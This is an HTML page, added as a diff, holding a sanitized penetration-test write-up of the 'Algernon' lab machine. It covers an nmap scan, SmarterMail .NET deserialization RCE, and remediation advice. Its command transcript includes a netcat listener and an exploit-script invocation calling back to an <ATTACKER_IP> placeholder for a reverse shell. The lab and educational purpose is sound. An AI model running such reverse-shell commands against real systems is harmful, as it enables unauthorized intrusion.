@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PG Practice Report: Algernon (Sanitized) | Josh Chalabi</title>
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            "cyber-black": "#0b1020",
+            "cyber-gray": "#0f1733",
+            "cyber-green": "#5eead4",
+            "cyber-green-dim": "rgba(94, 234, 212, 0.1)",
+            "cyber-purple": "#a78bfa",
+            "cyber-red": "#ff003c",
+          },
+          fontFamily: {
+            mono: ['"Fira Code"', "monospace"],
+            tech: ['"Share Tech Mono"', "monospace"],
+          },
+          boxShadow: {
+            neon: "0 0 10px rgba(94, 234, 212, 0.5), 0 0 20px rgba(94, 234, 212, 0.3)",
+          },
+        },
+      },
+    };
+  </script>
+
+  <style>
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: #0b1020; }
+    ::-webkit-scrollbar-thumb { background: #23305f; border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: #5eead4; }
+
+    .bg-grid {
+      background-size: 40px 40px;
+      background-image:
+        linear-gradient(to right, rgba(94, 234, 212, 0.05) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(167, 139, 250, 0.05) 1px, transparent 1px);
+    }
+
+    /* Code blocks */
+    pre {
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+  </style>
+</head>
+
+<body class="bg-cyber-black text-gray-300 font-mono relative overflow-x-hidden min-h-screen flex flex-col">
+  <!-- Background Overlay -->
+  <div class="fixed inset-0 bg-grid pointer-events-none z-0"></div>
+
+  <!-- Navbar -->
+  <nav class="fixed w-full z-50 bg-cyber-black/90 backdrop-blur-md border-b border-[#23305f]">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex items-center justify-between h-16">
+        <div class="flex-shrink-0">
+          <a href="../reports.html" class="text-2xl font-bold text-cyber-green font-tech tracking-wider">&lt;josh/&gt;</a>
+        </div>
+        <div class="flex items-center gap-4">
+          <a href="../reports.html" class="flex items-center text-gray-300 hover:text-white transition-colors">
+            <i class="fas fa-arrow-left mr-2"></i> Back to Reports
+          </a>
+          <a href="../index.html" class="hidden sm:flex items-center text-gray-300 hover:text-white transition-colors">
+            <i class="fas fa-house mr-2"></i> Home
+          </a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Main Content -->
+  <main class="relative z-10 pt-28 pb-20 max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 flex-grow">
+
+    <!-- Header -->
+    <div class="bg-cyber-gray border border-[#23305f] rounded-2xl p-6 md:p-8 shadow-neon">
+      <div class="flex flex-col md:flex-row md:items-start md:justify-between gap-6">
+        <div class="min-w-0">
+          <h1 class="text-3xl md:text-4xl font-bold text-white break-words">
+            <span class="text-cyber-green">./</span> PG Practice Report: <span class="text-cyber-green">Algernon</span>
+          </h1>
+          <p class="text-gray-400 mt-2 leading-relaxed">This document presents a fully sanitized, OSCP-style penetration testing report for the Proving Grounds practice machine <strong>Algernon</strong>. The write-up focuses on realistic attacker methodology: initial reconnaissance, service analysis, vulnerability identification, exploitation logic, impact assessment, and remediation guidance. All sensitive lab-specific details (IPs, flags, tokens, exact exploit internals) have been intentionally removed to make this report safe for public sharing while preserving its technical and educational value.</p>
+
+          <div class="flex flex-wrap items-center gap-2 mt-4">
+            <span class="text-xs bg-green-900/30 text-green-300 border border-green-900 px-2 py-1 rounded">CTF / Lab</span>
+            <span class="text-xs bg-[#1a2342] text-gray-200 border border-[#23305f] px-2 py-1 rounded">Windows</span>
+            <span class="text-xs bg-[#1a2342] text-gray-200 border border-[#23305f] px-2 py-1 rounded">Initial Access: RCE</span>
+            <span class="text-xs bg-red-900/20 text-red-200 border border-red-900 px-2 py-1 rounded">Impact: SYSTEM</span>
+          </div>
+        </div>
+
+        <div class="flex-shrink-0 w-full md:w-auto">
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-400">Report Metadata</div>
+            <dl class="mt-3 space-y-2 text-sm">
+              <div class="flex justify-between gap-6">
+                <dt class="text-gray-500">Author</dt>
+                <dd class="text-white">Josh Chalabi</dd>
+              </div>
+              <div class="flex justify-between gap-6">
+                <dt class="text-gray-500">Environment</dt>
+                <dd class="text-white">OffSec Proving Grounds</dd>
+              </div>
+              <div class="flex justify-between gap-6">
+                <dt class="text-gray-500">Sanitization</dt>
+                <dd class="text-white">IPs / Flags removed</dd>
+              </div>
+              <div class="flex justify-between gap-6">
+                <dt class="text-gray-500">Date</dt>
+                <dd class="text-white">2025</dd>
+              </div>
+            </dl>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    
+
+    <!-- Executive Summary -->
+    <section id="executive-summary" class="mt-8">
+      <div class="bg-cyber-gray border border-[#23305f] rounded-2xl p-6">
+        <h2 class="text-2xl font-bold text-white"><span class="text-cyber-green">1.</span> Executive Summary</h2>
+        <p class="text-gray-300 mt-4 leading-relaxed">During the assessment, the target system was evaluated from an external attacker perspective with no prior knowledge or credentials. Network-facing services were enumerated to build an attack surface profile, after which a vulnerable mail service component was identified. By leveraging a known weakness in the service’s handling of serialized .NET objects, remote code execution was achieved. Due to the service running with excessive privileges in this lab configuration, the compromise immediately resulted in SYSTEM-level access, representing a complete loss of confidentiality, integrity, and availability.</p>
+
+        <div class="mt-6 grid grid-cols-1 md:grid-cols-3 gap-4">
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-500">Risk</div>
+            <div class="mt-1 text-xl font-bold text-red-200">Critical</div>
+          </div>
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-500">Business Impact</div>
+            <div class="mt-1 text-white">Full system compromise</div>
+          </div>
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-500">Attack Complexity</div>
+            <div class="mt-1 text-white">Low (known exploit)</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Scope -->
+    <section id="scope" class="mt-8">
+      <div class="bg-cyber-gray border border-[#23305f] rounded-2xl p-6">
+        <h2 class="text-2xl font-bold text-white"><span class="text-cyber-green">2.</span> Scope & Assumptions</h2>
+
+        <ul class="mt-4 space-y-2 text-gray-300 text-sm leading-relaxed list-disc pl-5">
+          <li>This is a lab environment (OffSec Proving Grounds). All actions were performed for learning and validation.</li>
+          <li>All sensitive identifiers have been removed: IP addresses, hostnames, usernames, tokens, and proof strings.</li>
+          <li>Commands are presented with placeholders such as <span class="text-white">&lt;TARGET_IP&gt;</span> and <span class="text-white">&lt;ATTACKER_IP&gt;</span>.</li>
+          <li>No persistence was established. Actions focused on achieving validated administrative control.</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Recon -->
+    <section id="recon" class="mt-8">
+      <div class="bg-cyber-gray border border-[#23305f] rounded-2xl p-6">
+        <h2 class="text-2xl font-bold text-white"><span class="text-cyber-green">3.</span> Recon & Enumeration</h2>
+
+        <div class="mt-4">
+          <h3 class="text-lg font-bold text-white">3.1 Service Discovery</h3>
+          <p class="text-gray-300 mt-2 text-sm leading-relaxed">
+            A TCP scan identified FTP and multiple HTTP endpoints. One web service presented a SmarterMail login portal.
+          </p>
+
+          <div class="mt-4 bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="flex items-center justify-between flex-wrap gap-2">
+              <div class="text-sm text-gray-400"><i class="fas fa-terminal text-cyber-green mr-2"></i>Example scan (sanitized)</div>
+              <span class="text-xs text-gray-500">Placeholders used</span>
+            </div>
+            <pre class="mt-3 text-xs text-gray-200"><code># Nmap 7.95 scan initiated Wed Nov 26 15:45:12 2025 as: \/usr\/lib\/nmap\/nmap -sV -sT -p- -Pn -oN algernon.md &lt;TARGET_IP&gt;
+Nmap scan report for &lt;TARGET_IP&gt;
+Host is up (0.053s latency).
+Not shown: 65483 closed tcp ports (conn-refused), 37 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+21\/tcp    open  ftp           Microsoft ftpd
+80\/tcp    open  http          Microsoft IIS httpd 10.0
+135\/tcp   open  msrpc         Microsoft Windows RPC
+139\/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445\/tcp   open  microsoft-ds?
+5040\/tcp  open  unknown
+7680\/tcp  open  tcpwrapped
+9998\/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP\/UPnP)
+17001\/tcp open  remoting      MS .NET Remoting services
+49664\/tcp open  msrpc         Microsoft Windows RPC
+49665\/tcp open  msrpc         Microsoft Windows RPC
+49666\/tcp open  msrpc         Microsoft Windows RPC
+49667\/tcp open  msrpc         Microsoft Windows RPC
+49668\/tcp open  msrpc         Microsoft Windows RPC
+49669\/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:\/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https:\/\/nmap.org\/submit\/
+# Nmap done at Wed Nov 26 15:49:20 2025 -- 1 IP address (1 host up) scanned in 248.18 seconds</code></pre>
+          </div>
+        </div>
+
+        <div class="mt-6">
+          <h3 class="text-lg font-bold text-white">3.2 Web Triage</h3>
+          <p class="text-gray-300 mt-2 text-sm leading-relaxed">
+            The web interface on the non-standard HTTP port exposed SmarterMail. Version information was observed in the UI / source,
+            enabling rapid vulnerability mapping.
+          </p>
+
+          <div class="mt-4 grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+              <div class="text-sm text-gray-400">Observation</div>
+              <div class="mt-2 text-sm text-gray-200">SmarterMail portal reachable on a non-standard port.</div>
+            </div>
+            <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+              <div class="text-sm text-gray-400">Key Detail</div>
+              <div class="mt-2 text-sm text-gray-200">Version exposed → allowed CVE matching and exploit selection.</div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Findings -->
+    <section id="findings" class="mt-8">
+      <div class="bg-cyber-gray border border-[#23305f] rounded-2xl p-6">
+        <h2 class="text-2xl font-bold text-white"><span class="text-cyber-green">4.</span> Findings</h2>
+
+        <!-- Finding card -->
+        <div class="mt-6 border border-[#23305f] rounded-2xl overflow-hidden">
+          <div class="bg-black/40 px-5 py-4 flex items-center justify-between gap-3 flex-wrap">
+            <div class="min-w-0">
+              <h3 class="text-lg font-bold text-white break-words"><i class="fas fa-bug text-cyber-green mr-2"></i>Remote Code Execution via SmarterMail (.NET Remoting Deserialization)</h3>
+              <p class="text-sm text-gray-400">Category: RCE · Attack Vector: Network · Authentication: Not Required (in this path)</p>
+            </div>
+            <span class="text-xs bg-red-900/20 text-red-200 border border-red-900 px-2 py-1 rounded whitespace-nowrap">Severity: Critical</span>
+          </div>
+
+          <div class="p-5 space-y-5">
+            <div>
+              <div class="text-sm text-gray-500">Description</div>
+              <p class="mt-2 text-sm text-gray-200 leading-relaxed">
+                The target exposed a SmarterMail service with an associated .NET remoting endpoint. The identified version was
+                affected by a deserialization-based remote code execution condition. An available public exploit was used to
+                trigger code execution and establish a reverse shell.
+              </p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+                <div class="text-sm text-gray-500">Impact</div>
+                <ul class="mt-2 text-sm text-gray-200 list-disc pl-5 space-y-1">
+                  <li>Arbitrary command execution</li>
+                  <li>Full host compromise</li>
+                  <li>Immediate SYSTEM privileges (lab configuration)</li>
+                </ul>
+              </div>
+              <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+                <div class="text-sm text-gray-500">Evidence</div>
+                <ul class="mt-2 text-sm text-gray-200 list-disc pl-5 space-y-1">
+                  <li>Service fingerprint: SmarterMail UI / headers</li>
+                  <li>Successful reverse connection</li>
+                  <li><code class="text-xs">whoami</code> returned SYSTEM context</li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+              <div class="text-sm text-gray-400"><i class="fas fa-shield-halved text-cyber-green mr-2"></i>Risk Notes</div>
+              <p class="mt-2 text-sm text-gray-200 leading-relaxed">
+                In real-world deployments, public-facing mail servers and admin portals are high-value targets. Exposed version strings
+                significantly reduce attacker effort. Unrestricted remoting endpoints and outdated software create a direct path to RCE.
+              </p>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Attack Path -->
+    <section id="attack-path" class="mt-8">
+      <div class="bg-cyber-gray border border-[#23305f] rounded-2xl p-6">
+        <h2 class="text-2xl font-bold text-white"><span class="text-cyber-green">5.</span> Attack Path</h2>
+
+        <div class="mt-4 grid grid-cols-1 lg:grid-cols-3 gap-4">
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-500">Step 1</div>
+            <div class="mt-2 text-sm text-gray-200">Identify exposed services (FTP/HTTP + SmarterMail portal).</div>
+          </div>
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-500">Step 2</div>
+            <div class="mt-2 text-sm text-gray-200">Map version → select deserialization RCE exploit path.</div>
+          </div>
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-500">Step 3</div>
+            <div class="mt-2 text-sm text-gray-200">Trigger payload → receive reverse shell as SYSTEM.</div>
+          </div>
+        </div>
+
+        <div class="mt-6 bg-black/40 border border-[#23305f] rounded-xl p-4">
+          <div class="text-sm text-gray-400"><i class="fas fa-route text-cyber-green mr-2"></i>Command transcript (sanitized)</div>
+          <pre class="mt-3 text-xs text-gray-200"><code># 1) Listener
+nc -lvnp &lt;LPORT&gt;
+
+# 2) Run public exploit (details omitted in sanitized report)
+python3 smartermail_rce.py --rhost &lt;TARGET_IP&gt; --rport &lt;SM_MAIL_PORT&gt; --lhost &lt;ATTACKER_IP&gt; --lport &lt;LPORT&gt;
+
+# 3) Validate context
+whoami
+# Expected (lab): nt authority\system</code></pre>
+          <p class="mt-3 text-xs text-gray-500">
+            Note: exploit internals and exact CVE tooling are intentionally not included in full to keep this write-up safe and reusable.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Evidence -->
+    <section id="evidence" class="mt-8">
+      <div class="bg-cyber-gray border border-[#23305f] rounded-2xl p-6">
+        <h2 class="text-2xl font-bold text-white"><span class="text-cyber-green">6.</span> Evidence</h2>
+
+        <div class="mt-4 grid grid-cols-1 md:grid-cols-2 gap-4">
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-400">Privilege Confirmation</div>
+            <pre class="mt-3 text-xs text-gray-200"><code>whoami
+nt authority\system</code></pre>
+          </div>
+
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-400">Proof Artifact</div>
+            <p class="mt-2 text-sm text-gray-200 leading-relaxed">
+              The lab proof file was accessed to validate compromise. The proof string is intentionally omitted.
+            </p>
+            <pre class="mt-3 text-xs text-gray-200"><code>type C:\\Users\\&lt;USER&gt;\\Desktop\\proof.txt
+&lt;REDACTED&gt;</code></pre>
+          </div>
+        </div>
+
+        <div class="mt-6 bg-black/40 border border-[#23305f] rounded-xl p-4">
+          <div class="text-sm text-gray-400"><i class="fas fa-image text-cyber-green mr-2"></i>Screenshots</div>
+          <p class="mt-2 text-sm text-gray-200 leading-relaxed">
+            If you want to include screenshots, place them under <code class="text-xs">images/</code> and reference them below.
+          </p>
+          <div class="mt-4 grid grid-cols-1 sm:grid-cols-2 gap-3">
+            <div class="border border-[#23305f] rounded-lg p-3 bg-[#0b1020]/40">
+              <div class="text-xs text-gray-400">Example: SmarterMail version page</div>
+              <div class="mt-2 text-xs text-gray-500">&lt;img src="images/algernon-smartermail.png" ...&gt;</div>
+            </div>
+            <div class="border border-[#23305f] rounded-lg p-3 bg-[#0b1020]/40">
+              <div class="text-xs text-gray-400">Example: Reverse shell / SYSTEM</div>
+              <div class="mt-2 text-xs text-gray-500">&lt;img src="images/algernon-system.png" ...&gt;</div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Remediation -->
+    <section id="remediation" class="mt-8">
+      <div class="bg-cyber-gray border border-[#23305f] rounded-2xl p-6">
+        <h2 class="text-2xl font-bold text-white"><span class="text-cyber-green">7.</span> Remediation</h2>
+
+        <div class="mt-4 space-y-4">
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-400"><i class="fas fa-arrow-up text-cyber-green mr-2"></i>Patch / Upgrade</div>
+            <p class="mt-2 text-sm text-gray-200 leading-relaxed">
+              Upgrade SmarterMail to a version that addresses the deserialization / remoting RCE condition. Maintain an operational
+              process for timely patching of internet-facing applications.
+            </p>
+          </div>
+
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-400"><i class="fas fa-network-wired text-cyber-green mr-2"></i>Reduce Attack Surface</div>
+            <p class="mt-2 text-sm text-gray-200 leading-relaxed">
+              Restrict administrative portals and non-standard service ports to trusted networks (VPN / allowlists). Disable or protect
+              unused remoting endpoints.
+            </p>
+          </div>
+
+          <div class="bg-black/40 border border-[#23305f] rounded-xl p-4">
+            <div class="text-sm text-gray-400"><i class="fas fa-eye text-cyber-green mr-2"></i>Hardening & Monitoring</div>
+            <ul class="mt-2 text-sm text-gray-200 list-disc pl-5 space-y-1">
+              <li>Remove or minimize version disclosure in HTTP responses / UI where possible.</li>
+              <li>Enable logging and alerting for suspicious deserialization / remoting patterns.</li>
+              <li>Apply least privilege to service accounts; avoid services running as SYSTEM when not required.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Appendix -->
+    <section id="appendix" class="mt-8">
+      <div class="bg-cyber-gray border border-[#23305f] rounded-2xl p-6">
+        <h2 class="text-2xl font-bold text-white"><span class="text-cyber-green">8.</span> Appendix</h2>
+
+        <div class="mt-4 bg-black/40 border border-[#23305f] rounded-xl p-4">
+          <div class="text-sm text-gray-400"><i class="fas fa-circle-info text-cyber-green mr-2"></i>Sanitization Checklist</div>
+          <ul class="mt-3 text-sm text-gray-200 list-disc pl-5 space-y-1">
+            <li>Replaced all IPs with <code class="text-xs">&lt;TARGET_IP&gt;</code> / <code class="text-xs">&lt;ATTACKER_IP&gt;</code></li>
+            <li>Removed proof string and any lab-specific tokens</li>
+            <li>Omitted exploit code internals; kept only high-level commands</li>
+            <li>Kept methodology, findings, and remediation intact</li>
+          </ul>
+        </div>
+
+        <div class="mt-6 text-xs text-gray-500">
+          Disclaimer: This document is for educational purposes in a controlled lab environment.
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="bg-black border-t border-[#23305f] py-8 mt-auto relative">
+    <div class="max-w-7xl mx-auto px-4 text-center">
+      <p class="text-gray-600 text-sm font-mono">
+        &copy; 2025 Josh Chalabi. <span class="text-cyber-green">Secure by Design.</span>
+      </p>
+    </div>
+  </footer>
+</body>
+</html>
